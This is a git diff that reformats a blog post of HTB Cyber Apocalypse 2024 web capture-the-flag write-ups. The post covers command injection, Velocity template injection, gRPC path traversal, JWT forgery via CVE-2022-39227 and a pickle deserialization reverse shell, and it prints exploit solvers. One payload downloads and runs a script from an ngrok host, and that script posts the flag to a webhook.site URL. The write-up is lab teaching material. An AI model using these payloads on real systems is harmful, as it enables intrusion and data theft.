@@ -1,12 +1,14 @@
 ---
 layout: post
-title:  "HTB Cyber Apocalypse 2024: Hacker Royale - Web"
-date:   2024-03-14 00:00:00
+title: "HTB Cyber Apocalypse 2024: Hacker Royale - Web"
+date: 2024-03-14 00:00:00
 description: "HTB Cyber Apocalypse 2024: Hacker Royale - Web"
 tag:
   - Web
 ---
+
 ![CyberApocalypse](/assets/img/HTB-Cyber-Apocalypse-2024/images/CyberApocalypse.jpg)
+
 <h2>Table of Contents</h2>
 - TOC	- TOC
 {:toc}
@@ -15,85 +17,86 @@ tag:
 
 **Solving Scenario:**\
 On the web, there are three JavaScript files:
+
 - command.js
 - main.js
 - game.js
 
 Focus on the CheckMessage() function in the main.js file, which is responsible for making a POST request to the /api/monitor endpoint with the request body containing "command". Additionally, there is an if condition availableOptions["secret"] that retrieves the value from the secret:
 
-``` javascript
+```javascript
 async function CheckMessage() {
-    fetchingResponse = true;
-    currentCommand = commandHistory[commandHistory.length - 1];
+  fetchingResponse = true;
+  currentCommand = commandHistory[commandHistory.length - 1];
 
-    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
-        await fetch('/api/monitor', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ 'command': currentCommand })
-        })
-            .then((res) => res.json())
-            .then(async (data) => {
-                console.log(data)
-                await displayLineInTerminal({ text: data.message });
+  if (
+    availableOptions[currentStep].includes(currentCommand) ||
+    availableOptions["secret"].includes(currentCommand)
+  ) {
+    await fetch("/api/monitor", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ command: currentCommand }),
+    })
+      .then((res) => res.json())
+      .then(async (data) => {
+        console.log(data);
+        await displayLineInTerminal({ text: data.message });
 
-                if(data.message.includes('Game over')) {
-                    playerLost();
-                    fetchingResponse = false;
-                    return;
-                }
+        if (data.message.includes("Game over")) {
+          playerLost();
+          fetchingResponse = false;
+          return;
+        }
 
-                if(data.message.includes('HTB{')) {
-                    playerWon();
-                    fetchingResponse = false;
+        if (data.message.includes("HTB{")) {
+          playerWon();
+          fetchingResponse = false;
 
-                    return;
-                }
+          return;
+        }
 
-                if (currentCommand == 'HEAD NORTH') {
-                    currentStep = '2';
-                }
-                else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
-                    currentStep = '3'
-                }
-                else if (currentCommand == 'SET UP CAMP') {
-                    currentStep = '4'
-                }
+        if (currentCommand == "HEAD NORTH") {
+          currentStep = "2";
+        } else if (currentCommand == "FOLLOW A MYSTERIOUS PATH") {
+          currentStep = "3";
+        } else if (currentCommand == "SET UP CAMP") {
+          currentStep = "4";
+        }
 
-                let lineBreak = document.createElement("br");
+        let lineBreak = document.createElement("br");
 
-
-                beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
-                displayLineInTerminal({ text: '<span class="command">You have 4 options!</span>' })
-                displayLinesInTerminal({ lines: availableOptions[currentStep] })
-                fetchingResponse = false;
-            });
-
-
-    }
-    else {
-        displayLineInTerminal({ text: "You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????" });
+        beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
+        displayLineInTerminal({
+          text: '<span class="command">You have 4 options!</span>',
+        });
+        displayLinesInTerminal({ lines: availableOptions[currentStep] });
         fetchingResponse = false;
-    }
+      });
+  } else {
+    displayLineInTerminal({
+      text: "You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????",
+    });
+    fetchingResponse = false;
+  }
 }
 ```
 
 Check the script at the bottom of main.js, where there is a GET request to the /api/options endpoint, which is then stored in the variable availableOptions. This endpoint serves to list available commands, including the secret value.
 
-``` javascript
+```javascript
 const fetchOptions = () => {
-    fetch('/api/options')
-        .then((data) => data.json())
-        .then((res) => {
-            availableOptions = res.allPossibleCommands;
-
-        })
-        .catch(() => {
-            availableOptions = undefined;
-        })
-}
+  fetch("/api/options")
+    .then((data) => data.json())
+    .then((res) => {
+      availableOptions = res.allPossibleCommands;
+    })
+    .catch(() => {
+      availableOptions = undefined;
+    });
+};
 ```
 
 Here is the list of available commands, including the secret:
@@ -148,7 +151,8 @@ Login with credentials admin:password123 and retrieve the flag:
 Upon analyzing the source code, it is found that the TimeModel.php model is vulnerable to PHP Command Injection because it uses the exec() function constructed from user input (TimeController.php) with the "format" parameter.
 
 TimeModel.php:
-``` php
+
+```php
 <?php
 class TimeModel
 {
@@ -167,7 +171,8 @@ class TimeModel
 ```
 
 TimeController.php:
-``` php
+
+```php
 <?php
 class TimeController
 {
@@ -197,7 +202,7 @@ Read the flag at /flag as per the Dockerfile:
 **Solving Scenario:**\
 Upon analyzing the source code, it is observed that in Main.java, the request parameter "text" will be stored in textString, and then this textString will be loaded into index.html using the Velocity template:
 
-``` java
+```java
 	@RequestMapping("/")
 	@ResponseBody
 	String index(@RequestParam(required = false, name = "text") String textString) {
@@ -239,7 +244,7 @@ Upon analyzing the source code, it is observed that in Main.java, the request pa
 
 The readFileToString function will replace "TEXT" in the index.html file and render textString:
 
-``` java
+```java
 	public static String readFileToString(String filePath, String replacement) throws IOException {
         StringBuilder content = new StringBuilder();
         BufferedReader bufferedReader = null;
@@ -247,7 +252,7 @@ The readFileToString function will replace "TEXT" in the index.html file and ren
         try {
             bufferedReader = new BufferedReader(new FileReader(filePath));
             String line;
-            
+
             while ((line = bufferedReader.readLine()) != null) {
                 line = line.replace("TEXT", replacement);
                 content.append(line);
@@ -271,7 +276,7 @@ The source code analysis is vulnerable to Server-Side Template Injection (SSTI) 
 
 Here is the exploit I used:
 
-``` python
+```python
 import requests
 from urllib.parse import *
 
@@ -283,12 +288,12 @@ class Exploit:
 
 	def exp(self):
 		payload = """
-		#set($s=\"\") 
-		#set($stringClass=$s.getClass()) 
-		#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime()) 
-		#set($process=$runtime.exec(\"curl -O https://faf0-182-253-54-11.ngrok-free.app/banua.sh\")) 
-		#set($process=$runtime.exec(\"chmod +x banua.sh\")) 
-		#set($process=$runtime.exec(\"sh banua.sh\")) 
+		#set($s=\"\")
+		#set($stringClass=$s.getClass())
+		#set($runtime=$stringClass.forName(\"java.lang.Runtime\").getRuntime())
+		#set($process=$runtime.exec(\"curl -O https://faf0-182-253-54-11.ngrok-free.app/banua.sh\"))
+		#set($process=$runtime.exec(\"chmod +x banua.sh\"))
+		#set($process=$runtime.exec(\"sh banua.sh\"))
 		#set($null=$process.waitFor() )
 		"""
 		data = {"text": payload}
@@ -303,7 +308,7 @@ if __name__ == "__main__":
 
 Content of the banua.sh file:
 
-``` sh
+```sh
 cat /flag* > /tmp/flag.txt && curl -d @/tmp/flag.txt https://webhook.site/e361f2f5-cc9c-45e5-959e-40639c22efab
 ```
 
@@ -322,7 +327,7 @@ Source code analysis reveals that the vulnerable code is in the grpc.go file, sp
 
 grpc.go file:
 
-``` go
+```go
 func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
 	if req.Customer == "" {
 		return nil, errors.New("Name is required")
@@ -342,7 +347,7 @@ func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmi
 
 home.go file handles the submission process when a customer submits a testimonial.
 
-``` go
+```go
 package handler
 
 import (
@@ -375,7 +380,7 @@ The testimonial submission request process uses the sendTestimonial function fou
 
 client.go file:
 
-``` go
+```go
 func (c *Client) SendTestimonial(customer, testimonial string) error {
 	ctx := context.Background()
 	// Filter bad characters.
@@ -389,6 +394,7 @@ func (c *Client) SendTestimonial(customer, testimonial string) error {
 ```
 
 Flow to obtain the flag:
+
 1. Path Traversal Overwrite File /view/home/index.templ
 2. Access the View index.templ
 
@@ -396,17 +402,17 @@ Exploit by directly calling the SubmitTestimonial method via gRPC to bypass the 
 
 The modified index.templ file will overwrite and read the flag, which is located at "/" (entrypoint.sh file):
 
-``` go
+```go
 func GetTestimonials() []string {
-	fsys := os.DirFS("/")	
-	files, err := fs.ReadDir(fsys, ".")		
+	fsys := os.DirFS("/")
+	files, err := fs.ReadDir(fsys, ".")
 	if err != nil {
 		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
 	}
 	var res []string
 	for _, file := range files {
 		fileContent, _ := fs.ReadFile(fsys, file.Name())
-		res = append(res, string(fileContent))		
+		res = append(res, string(fileContent))
 	}
 	return res
 }
@@ -414,7 +420,7 @@ func GetTestimonials() []string {
 
 Here is the solver:
 
-``` go
+```go
 package main
 
 import (
@@ -432,7 +438,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("failed to read file: %v", err)
 	}
-	
+
 	conn, err := grpc.Dial("83.136.252.96:51204", grpc.WithInsecure())
 	if err != nil {
 		log.Fatalf("did not connect: %v", err)
@@ -469,7 +475,7 @@ Source code analysis reveals that the requirements.txt file uses the python_jwt 
 
 In the haproxy.cfg config file, there is access protection to the /api/v1/get_ticket endpoint:
 
-``` sh
+```sh
 frontend haproxy
     bind 0.0.0.0:1337
     default_backend backend
@@ -479,7 +485,7 @@ frontend haproxy
 
 In the routes.py API file, the flag can be obtained with GET requests to the /api/v1/flag endpoint. However, a JWT with an administrator role is required:
 
-``` python
+```python
 @api_blueprint.route('/flag', methods=['GET'])
 @authorize_roles(['administrator'])
 def flag():
@@ -488,27 +494,28 @@ def flag():
 
 To obtain the JWT token, you need to make GET requests to the /api/v1/get_ticket endpoint, and you will receive a JWT token with a payload role as a guest:
 
-``` python
+```python
 @api_blueprint.route('/get_ticket', methods=['GET'])
 def get_ticket():
 
     claims = {
-        "role": "guest", 
+        "role": "guest",
         "user": "guest_user"
     }
-    
+
     token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
     return jsonify({'ticket: ': token})
 ```
 
 The exploitation flow to obtain the flag is as follows:
+
 1. Generate a JWT Token with access to /api/v1/get_ticket, bypassing haproxy with /api/v1/../v1/get_ticket
 2. JWT Token forgery with CVE-2022-39227 to change the role to administrator
 3. Access the /api/v1/flag endpoint
 
 Here is the solver:
 
-``` python
+```python
 import requests
 import json
 import subprocess
@@ -528,12 +535,12 @@ class Exploit:
 	def tokenForge(self):
 		exp = subprocess.check_output([f"python3 CVE-2022-39227/cve_2022_39227.py -j {self.generateToken()} -i 'role=administrator'"],shell=True).decode()
 		data = exp.split("\n\n")[1].split("\n")[1]
-		
+
 		return data
 
 	def getFlag(self):
 		flag = subprocess.check_output([f"curl -s -XGET {self.url}/api/v1/flag -H 'Authorization: {str(self.tokenForge())}'"],shell=True)
-		
+
 		return json.loads(flag.decode())
 
 
@@ -550,14 +557,16 @@ if __name__ == "__main__":
 
 **Solving Scenario:**\
 In the app.py file, it is known that app.config utilizes session memcached with the pylibmc library:
-``` python
+
+```python
 app.config["SESSION_TYPE"] = "memcached"
 app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
 app.config.from_object(__name__)
 ```
 
 When making a request to the web, the first process that runs is setting the session:
-``` python
+
+```python
 @app.before_request
 def before_request():
     if session.get("session") and len(session["session"]) > 86:
@@ -565,14 +574,15 @@ def before_request():
 ```
 
 There is only one endpoint "/set" on the web which functions to set session["uicolor"].
-``` python
+
+```python
 @app.route("/set")
 def set():
     uicolor = request.args.get("uicolor")
 
     if uicolor:
         session["uicolor"] = uicolor
-    
+
     return redirect("/")
 ```
 
@@ -585,7 +595,8 @@ After re-analyzing the source code, it was discovered that we can inject payload
 Let's proceed to exploit it by performing a reverse shell:
 
 Solver:
-``` python
+
+```python
 import pickle
 import os
 import requests
